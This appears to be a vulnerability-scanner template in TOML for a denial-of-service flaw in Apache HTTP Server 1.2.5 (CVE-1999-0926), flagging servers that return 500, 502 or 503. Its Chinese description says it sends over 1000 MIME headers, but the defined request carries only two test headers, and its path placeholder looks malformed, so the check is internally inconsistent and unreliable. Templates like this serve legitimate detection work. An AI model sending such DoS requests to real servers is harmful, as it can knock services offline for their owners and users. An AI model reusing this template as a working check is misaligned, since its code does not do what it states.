[info]
author = "ave"
description = "通过发送包含大量MIME头部的HTTP请求，验证Apache HTTP Server是否存在拒绝服务漏洞。发送超过1000个自定义MIME头部，观察服务器响应状态。"
id = "POC-AVE-1999-1309"
name = "Apache HTTP Server 1.2.5 MIME Header 拒绝服务漏洞 PoC"
severity = "medium"
tags = ["ave-1999-1309"]
vuln_id = [
    "CVE-1999-0926",
    "AVE-1999-1309",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"
X-Test-1 = "a"
X-Test-2 = "b"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    503,
    502,
]
type = "status"
